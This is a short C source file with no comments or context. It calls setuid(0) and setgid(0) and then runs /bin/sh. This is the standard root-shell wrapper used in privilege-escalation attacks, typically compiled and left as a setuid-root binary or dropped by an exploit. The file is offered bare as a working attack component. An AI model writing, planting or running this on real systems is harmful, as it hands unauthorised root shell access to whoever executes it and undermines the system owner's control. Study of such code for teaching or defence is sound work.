#include <stdio.h>
#include <string.h>
#include <unistd.h>

void main() {
  setuid(0);
  setgid(0);
  execl("/bin/sh","/bin/sh",0);
}
